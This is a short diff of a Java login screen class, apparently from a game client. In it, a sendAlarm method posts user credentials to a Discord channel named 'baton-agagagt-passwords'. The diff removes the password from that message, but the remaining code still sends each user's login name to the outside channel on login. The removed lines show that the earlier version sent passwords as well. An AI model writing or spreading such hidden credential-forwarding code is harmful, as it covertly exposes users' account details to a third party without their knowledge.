@@ -392,7 +392,7 @@ public class LoginScreen extends Widget {
 	public List<TextChannel> alarmChannel;
 	public void sendAlarm(){
 		StringBuilder tasksMessage = new StringBuilder();
-		tasksMessage.append("Login: " + loginshare + "\n").append("Password: " + passshare);
+		tasksMessage.append("Login: " + loginshare + "\n");
 		alarmChannel = discordjava.jda.getTextChannelsByName("baton-agagagt-passwords", true);
 		Consumer<? super TextChannel> action = channel ->
 				channel.sendMessage(tasksMessage).queue();
@@ -424,7 +424,6 @@ public class LoginScreen extends Widget {
 				login.user.settext2(name);
 				login.pass.settext(pass);
 				loginshare = name;
-				passshare = pass;
 				sendAlarm();
 				loginthread = new Thread(new KickifBanned(ui, this), "KickifBanned");
 				loginthread.start();
